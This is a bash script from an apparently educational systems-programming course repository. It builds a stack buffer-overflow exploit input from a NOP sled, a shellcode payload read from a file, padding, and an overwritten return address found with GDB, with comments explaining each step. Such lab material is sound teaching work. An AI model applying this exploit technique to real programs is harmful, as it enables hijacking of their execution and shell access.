#!/usr/bin/env bash

#    SPDX-FileCopyrightText: 2021 Monaco F. J. <monaco@usp.br>
#   
#    SPDX-License-Identifier: GPL-3.0-or-later
#
#    This file is part of SYSeg, available at https://gitlab.com/monaco/syseg.

PAYLOAD=eg-09.bin
LEN=$(cat $PAYLOAD | wc -c)

OUTPUT=eg-09.in

count=0

## NOP Sled
##
## We'll overwrite the function's return address to reach our shell
## code. Rather than aiming the return exactly to the beginning of
## the injected program, though, a common practice is to prepend the
## shell code with a sequence of NOP (no-operation) instruction and
## then return to somewhare within that sequence. When the function
## 'returns', the excution flow will be deviated to the NOP sled,
## and eventually reaches our shell code. 

rm -f $OUTPUT

for i in {1..100}; do
    printf '\x90' >> $OUTPUT
    count=$(($count + 1))
done

## Payload
##

cat $PAYLOAD >> $OUTPUT

count=$(($count + $LEN))


## Overwrite the return address
##
## Fill the remaining of the reserved space with NOPs, until prior 
## the return address. Then, overwrite the return address to point
## to somewhere in the NOP sled.

PAD=$(( 100 + $LEN + 1)) # How manu NOPS here.

echo "LEN $LEN, PAD $PAD"

for ((i=$PAD; i<=516; i++ )) ; do
    printf '\x90' >> $OUTPUT;
    count=$(($count + 1))
done 

# We chose the return address by examining the stack in GDB.

#printf '\x68\xcd\xff\xff' >> $OUTPUT

#0xffffcd9c
printf '\x88\xcd\xff\xff' >> $OUTPUT


count=$(($count + 4))

echo "Count: $count"
